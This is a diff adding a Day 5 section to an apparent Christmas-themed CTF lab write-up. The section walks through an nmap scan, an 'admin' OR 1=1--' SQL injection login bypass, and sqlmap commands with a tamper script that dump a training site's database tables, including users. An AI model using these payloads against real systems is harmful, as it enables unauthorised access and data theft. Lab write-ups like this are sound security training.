@@ -142,14 +142,73 @@ Answer
 
 ## Day 5: Someone stole Santa's gift list!
 
+scan the target
 
+```
+nmap -sS -sV -T4 10.10.81.14
+```
 
+![image](https://user-images.githubusercontent.com/90561566/215713821-073d7927-9469-4cdd-88ec-272a99001b95.png)
 
+there are a training web at port 3000 and our challenge at port 8000 and MySQL version 8.0.22
 
+![image](https://user-images.githubusercontent.com/90561566/215713972-3ab5fe11-bee3-4a42-854e-c6f28cc36a64.png)
 
+view the website at port 8000
 
+![image](https://user-images.githubusercontent.com/90561566/215714939-29a2ef79-d0f4-45e5-a046-a50f48090c94.png)
 
+i found santa's panel at /santapanel
 
+![image](https://user-images.githubusercontent.com/90561566/215715675-e08be8f4-0a1f-45b1-ace3-4f351f516112.png)
+
+bypass the login by basic sqli
+
+```
+admin' OR 1=1--
+```
+
+after login as santa
+
+![image](https://user-images.githubusercontent.com/90561566/215716058-d0dbc960-9c43-48bd-844c-648783e84022.png)
+
+catch a search request with burpsuite and save to search.txt
+
+```
+sqlmap -r search.txt --tamper=space2comment --dbms sqlite
+```
+
+![image](https://user-images.githubusercontent.com/90561566/215719302-094db17c-710b-4047-bfab-d5dad7719217.png)
+
+```
+sqlmap -r search.txt --tamper=space2comment --dbms sqlite --count
+```
+
+![image](https://user-images.githubusercontent.com/90561566/215719719-b69bd70d-b772-464c-beed-3f9b2951fc14.png)
+
+```
+sqlmap -r search.txt --tamper=space2comment --dbms sqlite -D gift -T sequels --dump
+```
+
+![image](https://user-images.githubusercontent.com/90561566/215719968-229214a7-2d06-484f-af7f-682e5dd0200b.png)
+
+```
+sqlmap -r search.txt --tamper=space2comment --dbms sqlite -D gift -T hidden_table --dump
+```
+
+![image](https://user-images.githubusercontent.com/90561566/215720305-8df1fab2-7875-4d3f-b4a3-d2de8810c197.png)
+
+```
+sqlmap -r search.txt --tamper=space2comment --dbms sqlite -D gift -T users --dump
+```
+
+![image](https://user-images.githubusercontent.com/90561566/215720658-79367815-78db-4588-ad49-eaf49612d0ba.png)
+
+Answer
+
+![image](https://user-images.githubusercontent.com/90561566/215720797-5a9e3226-a299-4ea4-8d76-e9c15b2ad2b2.png)
+
+## Day 6: Be careful with what you wish on a Christmas night
 
 
 
